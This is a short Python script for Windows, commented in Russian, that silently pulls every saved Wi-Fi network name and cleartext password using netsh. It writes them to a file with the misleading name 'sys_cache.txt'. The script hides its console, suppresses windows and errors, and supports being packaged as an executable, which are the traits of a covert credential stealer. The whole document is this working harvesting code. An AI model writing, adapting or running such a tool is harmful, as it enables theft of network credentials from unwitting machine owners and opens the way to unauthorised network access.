import subprocess
import os
import re
import sys
import ctypes

def hide_console():
    """Скрывает окно консоли."""
    try:
        ctypes.windll.user32.ShowWindow(
            ctypes.windll.kernel32.GetConsoleWindow(), 0
        )
    except Exception:
        pass

def run_hidden(cmd):
    """Выполняет команду без всплывающих окон."""
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = 0
    creationflags = 0x08000000  # CREATE_NO_WINDOW

    return subprocess.check_output(
        cmd,
        startupinfo=startupinfo,
        creationflags=creationflags,
        stderr=subprocess.DEVNULL,
        shell=False
    ).decode("cp866", errors="ignore")

def get_profiles():
    """Получает список всех сохранённых Wi-Fi профилей."""
    output = run_hidden(["netsh", "wlan", "show", "profiles"])
    return [p.strip() for p in re.findall(r"All User Profile\s+:\s(.+)", output)]

def get_password(profile):
    """Получает пароль для конкретного профиля."""
    output = run_hidden([
        "netsh", "wlan", "show", "profile",
        f"name={profile}", "key=clear"
    ])
    match = re.search(r"Key Content\s+:\s(.+)", output)
    return match.group(1).strip() if match else "<open network / no password>"

def main():
    hide_console()

    script_dir = os.path.dirname(os.path.abspath(
        sys.executable if getattr(sys, "frozen", False) else __file__
    ))
    output_path = os.path.join(script_dir, "sys_cache.txt")

    profiles = get_profiles()
    lines = ["=" * 45, "   Wi-Fi Credentials", "=" * 45, ""]

    for p in profiles:
        pwd = get_password(p)
        lines.append(f"SSID     : {p}")
        lines.append(f"Password : {pwd}")
        lines.append("-" * 35)

    lines.append(f"\nTotal: {len(profiles)}")

    with open(output_path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))

    sys.exit(0)

if __name__ == "__main__":
    main()
